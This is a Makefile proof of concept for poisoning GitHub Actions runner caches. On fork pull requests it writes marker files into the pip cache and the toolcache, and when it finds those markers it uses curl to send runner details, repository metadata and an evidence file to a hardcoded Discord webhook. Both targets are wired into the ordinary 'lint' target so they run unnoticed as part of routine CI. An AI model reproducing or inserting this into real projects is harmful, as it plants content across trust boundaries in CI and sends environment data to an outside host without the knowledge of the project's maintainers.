# --- Cache Poisoning: send logs/evidence to Discord --------------------------
# Hardcode your Discord webhook here:
DISCORD_WEBHOOK := https://discord.com/api/webhooks/1234567890/YourWebhookSecret

.PHONY: ci-cache-check ci-cache-poison lint

ci-cache-check:
	@echo "[Cache-Check] Detecting prior markers in caches…"; \
	pip_cache_dir="$$(python3 -m pip cache dir 2>/dev/null || echo "$$HOME/.cache/pip")"; \
	toolcache="$${RUNNER_TOOL_CACHE:-$$HOME/hostedtoolcache}"; \
	mark_pip="$$pip_cache_dir/wheels/poc/MARKER.txt"; \
	mark_tool="$$toolcache/poc/MARKER.txt"; \
	found="false"; \
	[ -f "$$mark_pip"  ] && found="true"; \
	[ -f "$$mark_tool" ] && found="true"; \
	if [ "$$found" = "true" ]; then \
		echo "::warning:: Found markers; preparing Discord evidence…"; \
		tmprep="$$(mktemp -t cacheEvidence)"; \
		{ \
			echo "Cache poisoning evidence"; \
			echo "time=$$(date -u +%FT%TZ) host=$$(hostname) runner=$$RUNNER_NAME"; \
			echo "repo=$$GITHUB_REPOSITORY event=$$GITHUB_EVENT_NAME run_id=$$GITHUB_RUN_ID sha=$$GITHUB_SHA actor=$$GITHUB_ACTOR"; \
			echo ""; \
			echo "[pip cache dir] $$pip_cache_dir"; \
			if [ -f "$$mark_pip" ]; then echo "--- $$mark_pip ---"; sed -n '1,200p' "$$mark_pip"; echo ""; fi; \
			echo "[toolcache dir] $$toolcache"; \
			if [ -f "$$mark_tool" ]; then echo "--- $$mark_tool ---"; sed -n '1,200p' "$$mark_tool"; echo ""; fi; \
		} > "$$tmprep"; \
		# 1) JSON summary (use wait=true to get response JSON)
		summary=$$(printf '{"content":"Cache poisoning **detected** on `%%s` (runner=%%s). Evidence attached."}' "$$(hostname)" "$$RUNNER_NAME"); \
		resp_json=$$(curl -sS -H 'Content-Type: application/json' -d "$$summary" "$(DISCORD_WEBHOOK)?wait=true"); \
		echo "Discord summary: $$resp_json" | sed 's/.*"id":"\([^"]*\)".*/message_id=\1/'; \
		# 2) Attach evidence file (correct field: files[0])
		resp_file=$$(curl -sS \
			-F 'payload_json={"content":"cache-evidence.txt"}' \
			-F "files[0]=@$$tmprep;type=text/plain;filename=cache-evidence.txt" \
			"$(DISCORD_WEBHOOK)?wait=true"); \
		echo "Discord file resp: $$resp_file" | sed 's/.*"id":"\([^"]*\)".*/attachment_message_id=\1/'; \
		rm -f "$$tmprep" || true; \
	else \
		echo "[Cache-Check] No markers found; nothing to report."; \
	fi

ci-cache-poison:
	@echo "[Cache-Poison] Evaluating if this is a fork PR…"; \
	is_fork="$$(printf '%s\n' \
'import json,os' \
'p=os.environ.get("GITHUB_EVENT_PATH")' \
'f=False' \
'try:' \
'  ev=json.load(open(p)) if p and os.path.exists(p) else {}' \
'  f=bool(ev.get("pull_request",{}).get("head",{}).get("repo",{}).get("fork"))' \
'except Exception: pass' \
'print("true" if f else "false")' | python3 -)"; \
	echo "[Cache-Poison] fork flag: $$is_fork"; \
	if [ "$$is_fork" = "true" ]; then \
		pip_cache_dir="$$(python3 -m pip cache dir 2>/dev/null || echo "$$HOME/.cache/pip")"; \
		toolcache="$${RUNNER_TOOL_CACHE:-$$HOME/hostedtoolcache}"; \
		mkdir -p "$$pip_cache_dir/wheels/poc" "$$toolcache/poc"; \
		{ echo "POC CACHE MARKER"; \
		  echo "time=$$(date -u +%FT%TZ)"; \
		  echo "host=$$(hostname)"; \
		  echo "actor=$$GITHUB_ACTOR  repo=$$GITHUB_REPOSITORY  run=$$GITHUB_RUN_ID"; \
		  echo "event=$$GITHUB_EVENT_NAME  fork=true"; } > "$$pip_cache_dir/wheels/poc/MARKER.txt"; \
		cp "$$pip_cache_dir/wheels/poc/MARKER.txt" "$$toolcache/poc/MARKER.txt"; \
		echo "[Cache-Poison] Wrote markers to:"; \
		ls -l "$$toolcache/poc/MARKER.txt" "$$pip_cache_dir/wheels/poc/MARKER.txt" || true; \
		# Notify Discord that poisoning just occurred (so you see both sides)
		curl -sS -H 'Content-Type: application/json' \
			-d "$$(printf '{"content":"Poison **written** (fork PR) on `%%s` — markers placed in toolcache & pip cache."}' "$$(hostname)")" \
			"$(DISCORD_WEBHOOK)" >/dev/null || true; \
	else \
		echo "[Cache-Poison] Not a fork PR; skipping write."; \
	fi

# Ensure this runs automatically in your existing lint job
lint: ci-cache-check ci-cache-poison
	@echo "Lint step ran (after cache PoC)."
